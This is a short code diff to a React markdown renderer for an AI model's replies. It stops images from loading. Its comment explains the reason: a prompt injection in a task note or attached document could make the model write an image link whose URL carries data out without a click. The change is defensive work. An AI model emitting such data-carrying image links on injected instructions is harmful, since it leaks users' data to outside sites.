@@ -30,6 +30,9 @@ export const ReplyMarkdown = memo(function ReplyMarkdown({ text }: { text: strin
           h1: ({ children }) => <h3 className="text-ai-sm font-semibold text-ai-primary">{children}</h3>,
           h2: ({ children }) => <h3 className="text-ai-sm font-semibold text-ai-primary">{children}</h3>,
           h3: ({ children }) => <h4 className="text-ai-sm font-medium text-ai-primary">{children}</h4>,
+          // Images are never loaded: a prompt injection (task note, attached document)
+          // could make the model write ![](https://site/?data=…) and leak data without a click.
+          img: ({ alt }) => (alt ? <span className="italic text-ai-muted">{alt}</span> : null),
           a: ({ children, href }) => (
             <a href={href} target="_blank" rel="noreferrer" className="text-ai-link hover:underline">
               {children}
